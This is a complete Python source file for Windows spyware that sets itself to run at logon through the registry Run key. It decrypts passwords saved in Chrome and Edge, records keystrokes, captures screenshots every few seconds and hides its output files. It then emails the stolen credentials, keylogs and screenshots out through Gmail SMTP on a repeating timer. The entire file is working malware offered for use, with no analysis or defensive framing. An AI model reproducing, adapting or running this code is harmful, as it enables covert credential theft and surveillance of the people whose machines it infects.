import os
import platform
import re
import threading
import smtplib
import subprocess
import sys
import time
import winreg as reg
import base64
import shutil
import sqlite3
import ctypes
import win32crypt
from datetime import datetime
from PIL import ImageGrab
from Cryptodome.Cipher import AES
from pynput.keyboard import Listener
from email.message import  EmailMessage

lock = threading.Lock()

def auto_run():
    def get_file_path():
        return sys.executable

    def add_to_registry(exe_path, key_name="mdsf"):
        #open registry
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_SET_VALUE)

        #add key to registry
        reg.SetValueEx(reg_key, key_name, 0, reg.REG_SZ, exe_path)
        reg.CloseKey(reg_key)

    exe_file_path = get_file_path()
    add_to_registry(exe_file_path)

def get_database_info():
    chrome_path_password = os.getenv('LOCALAPPDATA') + r"\Google\Chrome\User Data\Default\Login Data"
    chrome_path_key = os.getenv('LOCALAPPDATA') + r"\Google\Chrome\User Data\Local State"

    edge_path_password = os.getenv('LOCALAPPDATA') + r"\Microsoft\Edge\User Data\Default\Login Data"
    edge_path_key = os.getenv('LOCALAPPDATA') + r"\Microsoft\Edge\User Data\Local State"

    def encrypted_key(path_key):
        with open(path_key, 'r') as file:
            matches = re.findall(r'"encrypted_key":"(.+?)"', file.read())  # Find key value
            key = base64.b64decode(matches[0])[5:]  # Delete DPAPI
            secret_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            return secret_key

    def decrypted_password(path_password, path_key):
        secret_key = encrypted_key(path_key)

        copied_db = os.path.join(os.path.dirname(path_password), "LoginData_copy.db")
        shutil.copy(path_password, copied_db)

        conn = None

        try:
            conn = sqlite3.connect(copied_db)
            cursor = conn.cursor()
            cursor.execute(
                "SELECT origin_url, username_value, password_value FROM Logins WHERE password_element = 'password'")
            rows = cursor.fetchall()

            if (path_password == chrome_path_password):
                with open("db_chrome.txt", "w") as file:
                    for row in rows:
                        origin_url, username_value, password_value = row
                        if not password_value:
                            continue

                        iv = password_value[3:15]
                        encrypted_password = password_value[15:-16]
                        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
                        decrypt_password = cipher.decrypt(encrypted_password)
                        decrypt_password = decrypt_password.decode()

                        file.write(
                            f'{"+" * 50}\n'
                            f'Origin Url: {origin_url}\n'
                            f'Username: {username_value}\n'
                            f'Password: {decrypt_password}\n\n'
                        )
            elif (path_password == edge_path_password):
                with open("db_edge.txt", "w") as file:
                    for row in rows:
                        origin_url, username_value, password_value = row
                        if not password_value:
                            continue

                        iv = password_value[3:15]
                        encrypted_password = password_value[15:-16]
                        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
                        decrypt_password = cipher.decrypt(encrypted_password)
                        decrypt_password = decrypt_password.decode()

                        file.write(
                            f'{"+" * 50}\n'
                            f'Origin Url: {origin_url}\n'
                            f'Username: {username_value}\n'
                            f'Password: {decrypt_password}\n\n'
                        )
        except sqlite3.Error as e:
            print(f'{e}')

        finally:
            if conn:
                conn.close()

    decrypted_password(chrome_path_password, chrome_path_key)
    decrypted_password(edge_path_password, edge_path_key)

def keylog_start():
    shift_pressed = False

    def get_layout():
        user32 = ctypes.WinDLL('user32', use_last_error=True)
        hwnd = user32.GetForegroundWindow()
        thread_id = user32.GetWindowThreadProcessId(hwnd, None)
        layout_id = user32.GetKeyboardLayout(thread_id)
        lang_id = layout_id & (2 ** 16 - 1)
        if lang_id == 0x419:
            return 'ru'
        elif lang_id == 0x409:
            return 'en'
        else:
            return 'unknown'

    def key_to_char(key, layout, shift_pressed):
        data = str(key).replace("'", "")

        if data == 'Key.space':
            data = ' '
        elif data in ['Key.cmd', 'Key.ctrl_l', 'Key.right', 'Key.ctrl_r', 'Key.left', 'Key.tab', 'Key.ctrl',
                      'Key.backspace', 'Key.shift', 'Key.shift_r', 'Key.down']:
            data = ''
        elif data == 'Key.enter':
            data = '\n'
        elif 'Key' in data:
            data = ''

        if layout == 'ru':
            char_map = {
                'a': 'ф', 'b': 'и', 'c': 'с', 'd': 'в', 'e': 'у', 'f': 'а', 'g': 'п', 'h': 'р',
                'i': 'ш', 'j': 'о', 'k': 'л', 'l': 'д', 'm': 'ь', 'n': 'т', 'o': 'щ', 'p': 'з',
                'q': 'й', 'r': 'к', 's': 'ы', 't': 'е', 'u': 'г', 'v': 'м', 'w': 'ц', 'x': 'ч',
                'y': 'н', 'z': 'я', '[': 'х', ']': 'ъ', ',': 'б', '.': 'ю', ';': 'ж', "'": 'э',
                '`': 'ё',
                'A': 'Ф', 'B': 'И', 'C': 'С', 'D': 'В', 'E': 'У', 'F': 'А', 'G': 'П', 'H': 'Р',
                'I': 'Ш', 'J': 'О', 'K': 'Л', 'L': 'Д', 'M': 'Ь', 'N': 'Т', 'O': 'Щ', 'P': 'З',
                'Q': 'Й', 'R': 'К', 'S': 'Ы', 'T': 'Е', 'U': 'Г', 'V': 'М', 'W': 'Ц', 'X': 'Ч',
                'Y': 'Н', 'Z': 'Я', '{': 'Х', '}': 'Ъ', '<': 'Б', '>': 'Ю', ':': 'Ж', '"': 'Э',
                '~': 'Ё'
            }
            if shift_pressed:
                data.upper()
            return char_map.get(data, data)
        elif layout == 'en':
            if shift_pressed:
                data = data.upper()
            return data

    def on_press(key):
        nonlocal shift_pressed
        if key in ('Key.shift', 'Key.shift_r'):
            shift_pressed = True

        layout = get_layout()
        char = key_to_char(key, layout, shift_pressed)
        with open('log.txt', 'a', encoding='utf-8') as file:
            file.write(char)

    def on_release(key):
        nonlocal shift_pressed
        if key in ('Key.shift', 'Key.shift_r'):
            shift_pressed = False

    with Listener(on_press=on_press, on_release=on_release) as l:
        l.join()

def send_file(file_path, subject):
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587

    msg = EmailMessage()
    msg['From'] = 'your_gmail'
    msg['To'] = 'your_gmail'
    msg['Subject'] = subject

    with lock:
        if os.path.isdir(file_path):
            for file_name in os.listdir(file_path):
                file_path_local = os.path.join(file_path, file_name)

                if os.path.isfile(file_path_local):
                    with open(file_path_local, 'rb') as file:
                        file_data = file.read()
                        msg.add_attachment(
                            file_data,
                            maintype='image',
                            subtype='png',
                            filename=file_name
                        )
        elif os.path.isfile(file_path):
            with open(file_path, 'rb') as file:
                file_data = file.read()
                file_name = file.name
                msg.add_attachment(
                    file_data,
                    maintype='text',
                    subtype='plain',
                    filename=file_name
                )

        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login('your_gmail', 'password_app')
            server.send_message(msg)

def send_keylog_periodically(file_path_log):
    while True:
        send_file(file_path_log, "Log File")
        time.sleep(300)

def send_screenshots_periodically(file_path_screenshots):
    while True:
        send_file(file_path_screenshots, "screenshots")
        time.sleep(120)

def send_both_files():
    current_directory = os.path.dirname(sys.executable) if getattr(sys, 'frozen', False) else os.path.dirname(__file__)
    file_path_db_chrome = os.path.join(current_directory, 'db_chrome.txt')
    file_path_db_edge = os.path.join(current_directory, 'db_edge.txt')
    file_path_log = os.path.join(current_directory, 'log.txt')
    file_path_screenshots = os.path.join(current_directory, 'screenshots')

    send_file(file_path_db_chrome, "DB File Chrome")
    send_file(file_path_db_edge, "DB File Edge")
    
    keylog_email_thread = threading.Thread(target=send_keylog_periodically, args=(file_path_log,))
    keylog_email_thread.start()

    screenshots_email_thread = threading.Thread(target=send_screenshots_periodically, args=(file_path_screenshots,))
    screenshots_email_thread.start()

    return keylog_email_thread, screenshots_email_thread

def screnning(max_files=12):
    def create_directory(dir_name="screenshots"):
        if not os.path.exists(dir_name):
            os.mkdir(dir_name)
        return dir_name

    def screen(dir_name="screenshots"):
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        file_path = os.path.join(dir_name, f"screenshot_{timestamp}.png")
        with lock:
            screenshot = ImageGrab.grab(include_layered_windows=True, all_screens=True)
            screenshot.save(file_path)
            screenshot.close()

    def do_screnn():
        dir_name = create_directory()

        while True:
            screen(dir_name)
            time.sleep(10)
            if os.path.exists(dir_name):
                with lock:
                    files = sorted(
                        (os.path.join(dir_name, f) for f in os.listdir(dir_name)),
                        key=os.path.getctime
                    )
                    if len(files) > max_files:
                        for file in files[:max_files]:
                            os.remove(file)

    do_screnn()

def hide_file():
    current_directory = os.path.dirname(sys.executable) if getattr(sys, 'frozen', False) else os.path.dirname(__file__)
    file_path_db_chrome = os.path.join(current_directory, "db_chrome.txt")
    file_path_db_edge= os.path.join(current_directory, "db_edge.txt")
    file_path_log = os.path.join(current_directory, "log.txt")
    file_path_screenshots = os.path.join(current_directory, "screenshots")

    if not os.path.exists(file_path_log):
        open(file_path_log, 'w').close()

    if platform.system() == "Windows":
        for file_path in [file_path_db_chrome, file_path_db_edge, file_path_log, file_path_screenshots]:
            if os.path.exists(file_path):
                subprocess.run(
                    ['attrib', '+h', file_path],
                    creationflags=subprocess.CREATE_NO_WINDOW
                )

def main():
    # main thread
    auto_run()
    get_database_info()

    # second thread
    keylog_thread = threading.Thread(target=keylog_start)
    keylog_thread.daemon = True
    keylog_thread.start()

    # third thread
    screenshots_thread = threading.Thread(target=screnning, args=(12,))
    screenshots_thread.daemon = True
    screenshots_thread.start()

    hide_file()

    # fourth thread
    send_keylog_thread, send_screenshots_thread = send_both_files()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("some")

if __name__ == "__main__":
    main()
